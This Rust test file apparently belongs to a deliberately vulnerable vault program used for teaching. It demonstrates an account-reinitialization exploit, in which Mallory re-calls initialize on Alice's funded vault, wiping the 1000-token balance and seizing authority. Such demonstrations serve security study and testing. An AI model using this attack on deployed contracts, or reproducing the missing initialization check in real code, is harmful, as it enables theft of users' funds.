// Test file for Vulnerable Version: Account Reinitialization
// This test demonstrates that the exploit WORKS

#[tokio::test]
async fn test_reinitialization_exploit() {
    println!("\n=== EXPLOIT: Account Reinitialization ===\n");
    
    let alice = Keypair::new();
    let mallory = Keypair::new();
    let vault = Keypair::new();
    
    // Step 1: Alice initializes vault
    println!("1. Alice initializes vault");
    initialize_vault(&vault, &alice).await.unwrap();
    
    // Step 2: Alice deposits
    println!("2. Alice deposits 1000 tokens");
    deposit(&vault, 1000).await.unwrap();
    
    let balance = get_vault_balance(&vault).await;
    println!("   Vault balance: {}", balance);
    assert_eq!(balance, 1000);
    
    // Step 3: Mallory reinitializes (EXPLOIT)
    println!("\n3. Mallory calls initialize again");
    let result = initialize_vault(&vault, &mallory).await;
    
    // In vulnerable version: SUCCEEDS
    assert!(result.is_ok(), "Reinitialization should work in vulnerable version");
    
    println!("\n  EXPLOIT SUCCESSFUL!");
    println!("   ✗ Vault reinitialized");
    println!("   ✗ Balance reset to 0");
    println!("   ✗ Authority changed to Mallory");
    
    let balance = get_vault_balance(&vault).await;
    let authority = get_vault_authority(&vault).await;
    
    println!("\n   New balance: {}", balance);
    println!("   New authority: {}", authority);
    
    assert_eq!(balance, 0, "Balance should be reset");
    assert_eq!(authority, mallory.pubkey(), "Authority should be Mallory");
    
    println!("\n Alice lost 1000 tokens due to reinitialization!");
}